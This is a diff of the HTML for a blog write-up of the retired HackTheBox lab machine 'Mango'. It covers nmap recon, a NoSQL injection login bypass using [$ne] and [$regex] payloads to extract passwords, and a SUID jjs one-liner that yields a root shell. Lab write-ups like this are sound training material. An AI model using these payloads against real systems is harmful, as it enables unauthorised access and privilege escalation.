@@ -1,168 +1,122 @@
 
 <!DOCTYPE html>
+
 <html lang="en">
 <head>
-  <meta charset="utf-8" />
-  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
-  <meta name="HandheldFriendly" content="True" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <meta name="robots" content="" />
-
-  <link href="https://fonts.googleapis.com/css2?family=Source+Code+Pro:ital,wght@0,400;0,700;1,400&family=Source+Sans+Pro:ital,wght@0,300;0,400;0,700;1,400&display=swap" rel="stylesheet">
-
-    <link rel="stylesheet" type="text/css" href="../../theme/stylesheet/style.min.css">
-
-    <link id="dark-theme-style" rel="stylesheet" type="text/css"
-          media="(prefers-color-scheme: dark)"
-    href="../../theme/stylesheet/dark-theme.min.css">
-
-    <link id="pygments-dark-theme" rel="stylesheet" type="text/css"
-              media="(prefers-color-scheme: dark)"
-          href="../../theme/pygments/monokai.min.css">
-    <link id="pygments-light-theme" rel="stylesheet" type="text/css"
-              media="(prefers-color-scheme: light), (prefers-color-scheme: no-preference)"
-          href="../../theme/pygments/sas.min.css">
-
-
-  <link rel="stylesheet" type="text/css" href="../../theme/font-awesome/css/fontawesome.css">
-  <link rel="stylesheet" type="text/css" href="../../theme/font-awesome/css/brands.css">
-  <link rel="stylesheet" type="text/css" href="../../theme/font-awesome/css/solid.css">
-
-
-    <link href="https://maggick.fr/feeds/all.atom.xml" type="application/atom+xml" rel="alternate" title="maggick's logs Atom">
-
-
-
-  
-
-
- 
-
-<meta name="author" content="maggick" />
-<meta name="description" content="This is a writeup about a retired HacktheBox machine: Mango publish by MrR3boot on October 26 2019. This box is classified as a medium machine. It involves a interesting NoSQL injection and a SUID binary." />
-<meta name="keywords" content="security, boot2root, HTB, NoSQL, SUID, linux">
-
-
-  <meta property="og:site_name" content="maggick's logs"/>
-  <meta property="og:title" content="HTB: Mango"/>
-  <meta property="og:description" content="This is a writeup about a retired HacktheBox machine: Mango publish by MrR3boot on October 26 2019. This box is classified as a medium machine. It involves a interesting NoSQL injection and a SUID binary."/>
-  <meta property="og:locale" content="en_US"/>
-  <meta property="og:url" content="../../2020/04/htb-mango.html"/>
-  <meta property="og:type" content="article"/>
-  <meta property="article:published_time" content="2020-04-19 11:25:00+02:00"/>
-  <meta property="article:modified_time" content=""/>
-  <meta property="article:author" content="../../author/maggick.html">
-  <meta property="article:section" content="security"/>
-  <meta property="article:tag" content="security"/>
-  <meta property="article:tag" content="boot2root"/>
-  <meta property="article:tag" content="HTB"/>
-  <meta property="article:tag" content="NoSQL"/>
-  <meta property="article:tag" content="SUID"/>
-  <meta property="article:tag" content="linux"/>
-  <meta property="og:image" content="https://maggick.fr/media/image.png">
-
-  <title>maggick's logs &ndash; HTB: Mango</title>
-
-</head>
-<body >
-  <aside>
-    <div>
-      <a href="../../">
-        <img src="https://maggick.fr/media/image.png" alt="maggick's logs" title="maggick's logs">
-      </a>
-
-      <h1>
-        <a href="../../">maggick's logs</a>
-      </h1>
-
+<meta charset="utf-8"/>
+<meta content="IE=edge" http-equiv="X-UA-Compatible"/>
+<meta content="True" name="HandheldFriendly"/>
+<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+<meta content="" name="robots"/>
+<link href="https://fonts.googleapis.com/css2?family=Source+Code+Pro:ital,wght@0,400;0,700;1,400&amp;family=Source+Sans+Pro:ital,wght@0,300;0,400;0,700;1,400&amp;display=swap" rel="stylesheet"/>
+<link href="../../theme/stylesheet/style.min.css" rel="stylesheet" type="text/css"/>
+<link href="../../theme/stylesheet/dark-theme.min.css" id="dark-theme-style" media="(prefers-color-scheme: dark)" rel="stylesheet" type="text/css"/>
+<link href="../../theme/pygments/monokai.min.css" id="pygments-dark-theme" media="(prefers-color-scheme: dark)" rel="stylesheet" type="text/css"/>
+<link href="../../theme/pygments/sas.min.css" id="pygments-light-theme" media="(prefers-color-scheme: light), (prefers-color-scheme: no-preference)" rel="stylesheet" type="text/css"/>
+<link href="../../theme/font-awesome/css/fontawesome.css" rel="stylesheet" type="text/css"/>
+<link href="../../theme/font-awesome/css/brands.css" rel="stylesheet" type="text/css"/>
+<link href="../../theme/font-awesome/css/solid.css" rel="stylesheet" type="text/css"/>
+<link href="https://maggick.fr/feeds/all.atom.xml" rel="alternate" title="maggick's logs Atom" type="application/atom+xml"/>
+<meta content="maggick" name="author"/>
+<meta content="This is a writeup about a retired HacktheBox machine: Mango publish by MrR3boot on October 26 2019. This box is classified as a medium machine. It involves a interesting NoSQL injection and a SUID binary." name="description"/>
+<meta content="security, boot2root, HTB, NoSQL, SUID, linux" name="keywords"/>
+<meta content="maggick's logs" property="og:site_name">
+<meta content="HTB: Mango" property="og:title"/>
+<meta content="This is a writeup about a retired HacktheBox machine: Mango publish by MrR3boot on October 26 2019. This box is classified as a medium machine. It involves a interesting NoSQL injection and a SUID binary." property="og:description"/>
+<meta content="en_US" property="og:locale"/>
+<meta content="../../2020/04/htb-mango.html" property="og:url"/>
+<meta content="article" property="og:type"/>
+<meta content="2020-04-19 11:25:00+02:00" property="article:published_time"/>
+<meta content="" property="article:modified_time"/>
+<meta content="../../author/maggick.html" property="article:author"/>
+<meta content="security" property="article:section">
+<meta content="security" property="article:tag"/>
+<meta content="boot2root" property="article:tag"/>
+<meta content="HTB" property="article:tag"/>
+<meta content="NoSQL" property="article:tag"/>
+<meta content="SUID" property="article:tag"/>
+<meta content="linux" property="article:tag"/>
+<meta content="https://maggick.fr/media/image.png" property="og:image"/>
+<title>maggick's logs – HTB: Mango</title>
+</meta></meta></head>
+<body>
+<aside>
+<div>
+<a href="../../">
+<img alt="maggick's logs" src="https://maggick.fr/media/image.png" title="maggick's logs"/>
+</a>
+<h1>
+<a href="../../">maggick's logs</a>
+</h1>
 <p>Offensive security tales</p>
-
-      <nav>
-        <ul class="list">
-
-
-              <li>
-                <a target="_self"
-                   href="../../pages/about.html">
+<nav>
+<ul class="list">
+<li>
+<a href="../../pages/about.html" target="_self">
                   About
                 </a>
-              </li>
-              <li>
-                <a target="_self"
-                   href="../../pages/notes.html">
+</li>
+<li>
+<a href="../../pages/notes.html" target="_self">
                   Notes
                 </a>
-              </li>
-              <li>
-                <a target="_self"
-                   href="../../pages/tools.html">
+</li>
+<li>
+<a href="../../pages/tools.html" target="_self">
                   Tools
                 </a>
-              </li>
-
-        </ul>
-      </nav>
-
-      <ul class="social">
-          <li>
-            <a  class="sc-github" href="https://github.com/maggick" target="_blank">
-              <i class="fab fa-github"></i>
-            </a>
-          </li>
-          <li>
-            <a  class="sc-twitter" href="https://twitter.com/maggick_fr" target="_blank">
-              <i class="fab fa-twitter"></i>
-            </a>
-          </li>
-          <li>
-            <a  class="sc-stack-overflow" href="http://stackoverflow.com/users/1827067/maggick" target="_blank">
-              <i class="fab fa-stack-overflow"></i>
-            </a>
-          </li>
-          <li>
-            <a  class="sc-rss" href="https://maggick.fr/feeds/all.atom.xml" target="_blank">
-              <i class="fas fa-rss"></i>
-            </a>
-          </li>
-      </ul>
-    </div>
-
-  </aside>
-  <main>
-
-    <nav>
-      <a href="../../">Home</a>
-
-      <a href="/archives.html">Archives</a>
-      <a href="/categories.html">Categories</a>
-      <a href="/tags.html">Tags</a>
-
-      <a href="https://maggick.fr/feeds/all.atom.xml">Atom</a>
-
-    </nav>
-
+</li>
+</ul>
+</nav>
+<ul class="social">
+<li>
+<a class="sc-github" href="https://github.com/maggick" target="_blank">
+<i class="fab fa-github"></i>
+</a>
+</li>
+<li>
+<a class="sc-twitter" href="https://twitter.com/maggick_fr" target="_blank">
+<i class="fab fa-twitter"></i>
+</a>
+</li>
+<li>
+<a class="sc-stack-overflow" href="http://stackoverflow.com/users/1827067/maggick" target="_blank">
+<i class="fab fa-stack-overflow"></i>
+</a>
+</li>
+<li>
+<a class="sc-rss" href="https://maggick.fr/feeds/all.atom.xml" target="_blank">
+<i class="fas fa-rss"></i>
+</a>
+</li>
+</ul>
+</div>
+</aside>
+<main>
+<nav>
+<a href="../../">Home</a>
+<a href="/archives.html">Archives</a>
+<a href="/categories.html">Categories</a>
+<a href="/tags.html">Tags</a>
+<a href="https://maggick.fr/feeds/all.atom.xml">Atom</a>
+</nav>
 <article class="single">
-  <header>
-      
-    <h1 id="htb-mango">HTB: Mango</h1>
-    <p>
+<header>
+<h1 id="htb-mango">HTB: Mango</h1>
+<p>
       Posted on 19 Apr 2020 in <a href="../../category/security.html">security</a>
 
-        &#8226; 6 min read
+        • 6 min read
     </p>
-  </header>
-
-
-  <div>
-    <p><img class="align-left" src="/media/2020.04/mango_card.png" alt="Mango card" width="262"></p>
+</header>
+<div>
+<p><img alt="Mango card" class="align-left" src="/media/2020.04/mango_card.png" width="262"/></p>
 <p>This is a writeup about a retired HacktheBox machine:
 <a href="https://www.hackthebox.com/home/machines/profile/214">Mango</a> publish by
 <a href="https://www.hackthebox.com/home/users/profile/13531">MrR3boot</a> on October 26
 2019.
 This box is classified as a medium machine. It involves a interesting NoSQL injection
 and a SUID binary.</p>
-
-
 <h1>Recon</h1>
 <p>We start with an nmap scan. Only the ports 22 (SSH) 80 (HTTP) and 443 (HTTPS) are open.</p>
 <div class="highlight"><pre><span></span><code># Nmap 7.80 scan initiated Thu Nov 21 13:22:00 2019 as: nmap -p- -sSV -oA nmap 10.10.10.162
@@ -179,16 +133,15 @@ Service detection performed. Please report any incorrect results at https://nmap
 # Nmap done at Thu Nov 21 13:24:55 2019 -- 1 IP address (1 host up) scanned in 175.48 seconds
 # Web
 </code></pre></div>
-
 <p>We can run a dirb on both ports but this won't give use any lead.</p>
 <p>The website on port 443 is a search engine with an analytic part allowing to
 connect to a remote elastic search.</p>
 <p>When looking at the SSL certificate we get some information about a subdomain
 "staging-order.mango.htb". We add an entry to our <code>/etc/hosts</code> and are able to
 access the website.</p>
-<p><img alt="Mango certificat" src="/media/2020.04/mango_1.png"></p>
+<p><img alt="Mango certificat" class="image-process-article-image" src="/media/2020.04/derivatives/article-image/mango_1.png"/></p>
 <p>The web page is a simple authentication form.</p>
-<p><img alt="Mango login page" src="/media/2020.04/mango_2.png"></p>
+<p><img alt="Mango login page" class="image-process-article-image" src="/media/2020.04/derivatives/article-image/mango_2.png"/></p>
 <h1>NoSQL injection</h1>
 <p>The name of the box: Mango is a hint about the framework used. First off all I
 thought about <a href="https://www.mongodb.com/">MangoDB</a> but there is also a lot of
@@ -203,7 +156,7 @@ are the following: <code>username=admin&amp;password=place&amp;login=login</code
 <p>We bypass the authentication and are logged in as admin. But the new page is
 a static page with just some SVG images and a message indicating that the site
 is building.</p>
-<p><img alt="Mango plantation" src="/media/2020.04/mango_3.png"></p>
+<p><img alt="Mango plantation" class="image-process-article-image" src="/media/2020.04/derivatives/article-image/mango_3.png"/></p>
 <p><strong>note:</strong> I realized after exploiting the following that I was not getting the
 information about admin password but an other account as my payload have a
 <code>[$ne]</code> (not equal) in the username parameter.</p>
@@ -217,13 +170,12 @@ application send back a redirection until the parameter is 17 then just sending 
 <a href="https://github.com/maggick/vrac/blob/master/printable_chars">a list of printable characters</a>
 and a specific payload. When sorting the application answers by Status code we
 get the characters.</p>
-<p><img alt="Mango getting the password" src="/media/2020.04/mango_4.png"></p>
+<p><img alt="Mango getting the password" class="image-process-article-image" src="/media/2020.04/derivatives/article-image/mango_4.png"/></p>
 <div class="highlight"><pre><span></span><code>username[%24ne]=admin&amp;password[%24regex]=h3§q§.{13}&amp;login=login
 username[%24ne]=admin&amp;password[%24regex]=h3m§q§.{12}&amp;login=login
 username[%24ne]=admin&amp;password[%24regex]=h3mXK8RhU§q§.{6}&amp;login=login
 username[%24ne]=admin&amp;password[%24regex]=h3mXK8RhU~f{]f5§q§.{0}&amp;login=login
 </code></pre></div>
-
 <p>We finally get the password <code>h3mXK8RhU~f{]f5H</code>. We try to login with it but this
 not the admin password as mentioned earlier. We repeat the process with the
 following payload and get the admin password <code>t9KcS3&gt;!0B#2</code>.</p>
@@ -243,7 +195,6 @@ jjs  user.txt
 $ cat user.txt
 79bf31&lt;redacted&gt;
 </code></pre></div>
-
 <h1>Getting root</h1>
 <p>We start enumerating the box for privileges escalation. Listing our <code>sudo</code> right
 and the SUID binaries.</p>
@@ -306,86 +257,62 @@ admin@mango:/home/admin$ find / -perm -4000 -type f -exec ls -la {} 2&gt;/dev/nu
 -rwsr-xr-x 1 root root 436552 Mar  4  2019 /usr/lib/openssh/ssh-keysign
 -rwsr-sr-x 1 root root 101240 Mar 15  2019 /usr/lib/snapd/snap-confine
 </code></pre></div>
-
 <p>We search for the binaries on GTFObins and <a href="https://gtfobins.github.io/gtfobins/jjs/#suid">jjs</a>
 get our attention. We can directly use the gtfobins command but the process just hang.</p>
-<div class="highlight"><pre><span></span><code>admin@mango:/home/mango$ echo &quot;Java.type(&#39;java.lang.Runtime&#39;).getRuntime().exec(&#39;/bin/sh -pc \$@|sh\${IFS}-p _ echo sh -p &lt;$(tty) &gt;$(tty) 2&gt;$(tty)&#39;).waitFor()&quot; | /usr/lib/jvm/java-11-openjdk-/bin/jjs
+<div class="highlight"><pre><span></span><code>admin@mango:/home/mango$ echo "Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -pc \$@|sh\${IFS}-p _ echo sh -p &lt;$(tty) &gt;$(tty) 2&gt;$(tty)').waitFor()" | /usr/lib/jvm/java-11-openjdk-/bin/jjs
 Warning: The jjs tool is planned to be removed from a future JDK release
-jjs&gt; Java.type(&#39;java.lang.Runtime&#39;).getRuntime().exec(&#39;/bin/sh -pc $@|sh${IFS}-p _ echo sh -p &lt;/dev/pts/0 &gt;/dev/pts/0 2&gt;/dev/pts/0&#39;).waitFor()
+jjs&gt; Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -pc $@|sh${IFS}-p _ echo sh -p &lt;/dev/pts/0 &gt;/dev/pts/0 2&gt;/dev/pts/0').waitFor()
 #
 </code></pre></div>
-
 <p>We modify the command to use <code>/bin/bash</code> instead of <code>sh</code> and it work (the user input are
 not prompted when typing but when you hit enter it gives the command result).
 The first command is <code>id</code> the second is <code>cat /root/root.txt</code>.</p>
-<div class="highlight"><pre><span></span><code>admin@mango:/home/mango$ echo &quot;Java.type(&#39;java.lang.Runtime&#39;).getRuntime().exec(&#39;/bin/sh -pc \$@|sh\${IFS}-p _ echo /bin/bash -p &lt;$(tty) &gt;$(tty) 2&gt;$(tty)&#39;).waitFor()&quot; | /usr/lib/jvm/java-11-openjdk-amd64/bin/jjs
+<div class="highlight"><pre><span></span><code>admin@mango:/home/mango$ echo "Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -pc \$@|sh\${IFS}-p _ echo /bin/bash -p &lt;$(tty) &gt;$(tty) 2&gt;$(tty)').waitFor()" | /usr/lib/jvm/java-11-openjdk-amd64/bin/jjs
 Warning: The jjs tool is planned to be removed from a future JDK release
-jjs&gt; Java.type(&#39;java.lang.Runtime&#39;).getRuntime().exec(&#39;/bin/sh -pc $@|sh${IFS}-p _ echo /bin/bash -p &lt;/dev/pts/0 &gt;/dev/pts/0 2&gt;/dev/pts/0&#39;).waitFor()
+jjs&gt; Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -pc $@|sh${IFS}-p _ echo /bin/bash -p &lt;/dev/pts/0 &gt;/dev/pts/0 2&gt;/dev/pts/0').waitFor()
 bash-4.4# uid=4000000000(admin) gid=1001(admin) euid=0(root) groups=1001(admin)
 bash-4.4# 8a8ef&lt;redacted&gt;
 </code></pre></div>
-
 <h1>Wrapping up</h1>
 <p>The NoSQL injection was quit fun. Doing it manually with Burp was really
 interesting.</p>
 <p>The <code>jjs</code> privilege escalation was not really hard.</p>
-  </div>
-  <div class="tag-cloud">
-    <p>
-      <a href="../../tag/security.html">security</a>
-      <a href="../../tag/boot2root.html">boot2root</a>
-      <a href="../../tag/htb.html">HTB</a>
-      <a href="../../tag/nosql.html">NoSQL</a>
-      <a href="../../tag/suid.html">SUID</a>
-      <a href="../../tag/linux.html">linux</a>
-    </p>
-  </div>
-
-
-  <div class="neighbors">
-    <a class="btn float-left" href="../../2020/04/dawgctf-2020.html" title="DawgCTF 2020">
-      <i class="fa fa-angle-left"></i> Previous Post
-    </a>
-    <a class="btn float-right" href="../../2020/04/hackpack-ctf-2020.html" title="Hackpack CTF 2020">
-      Next Post <i class="fa fa-angle-right"></i>
-    </a>
-  </div>
-
-
-
-</article>
-
-    <footer>
+</div>
+<div class="tag-cloud">
 <p>
-  &copy; 2022  - This work is licensed under a <a rel="license" href="http://creativecommons.org/licenses/by/4.0/deed.en_US" target="_blank">Creative Commons Attribution</a>
+<a href="../../tag/security.html">security</a>
+<a href="../../tag/boot2root.html">boot2root</a>
+<a href="../../tag/htb.html">HTB</a>
+<a href="../../tag/nosql.html">NoSQL</a>
+<a href="../../tag/suid.html">SUID</a>
+<a href="../../tag/linux.html">linux</a>
+</p>
+</div>
+<div class="neighbors">
+<a class="btn float-left" href="../../2020/04/dawgctf-2020.html" title="DawgCTF 2020">
+<i class="fa fa-angle-left"></i> Previous Post
+    </a>
+<a class="btn float-right" href="../../2020/04/hackpack-ctf-2020.html" title="Hackpack CTF 2020">
+      Next Post <i class="fa fa-angle-right"></i>
+</a>
+</div>
+</article>
+<footer>
+<p>
+  © 2022  - This work is licensed under a <a href="http://creativecommons.org/licenses/by/4.0/deed.en_US" rel="license" target="_blank">Creative Commons Attribution</a>
 </p>
 <p>
 Built with <a href="http://getpelican.com" target="_blank">Pelican</a> using <a href="http://bit.ly/flex-pelican" target="_blank">Flex</a> theme
   <span class="footer-separator">|</span>
   Switch to the <a href="javascript:void(0)" onclick="theme.switch(`dark`)">dark</a> | <a href="javascript:void(0)" onclick="theme.switch(`light`)">light</a> | <a href="javascript:void(0)" onclick="theme.switch(`browser`)">browser</a> theme
-  <script id="dark-theme-script"
-          src="../../theme/dark-theme/dark-theme.min.js"
-          data-enable-auto-detect-theme="True"
-          data-default-theme="light"
-          type="text/javascript">
-  </script>
+  <script data-default-theme="light" data-enable-auto-detect-theme="True" id="dark-theme-script" src="../../theme/dark-theme/dark-theme.min.js" type="text/javascript">
+</script>
 </p><p>
-  <a rel="license"
-     href="http://creativecommons.org/licenses/by/4.0/"
-     target="_blank">
-    <img alt="Creative Commons License"
-         title="Creative Commons License"
-         style="border-width:0"
-           src="https://i.creativecommons.org/l/by/4.0/80x15.png"
-         width="80"
-         height="15"/>
-  </a>
-</p>    </footer>
-  </main>
-
-
-
-
+<a href="http://creativecommons.org/licenses/by/4.0/" rel="license" target="_blank">
+<img alt="Creative Commons License" height="15" src="https://i.creativecommons.org/l/by/4.0/80x15.png" style="border-width:0" title="Creative Commons License" width="80">
+</img></a>
+</p> </footer>
+</main>
 <script type="application/ld+json">
 {
   "@context" : "http://schema.org",
@@ -396,6 +323,5 @@ Built with <a href="http://getpelican.com" target="_blank">Pelican</a> using <a 
   "description": ""
 }
 </script>
-
 </body>
 </html>
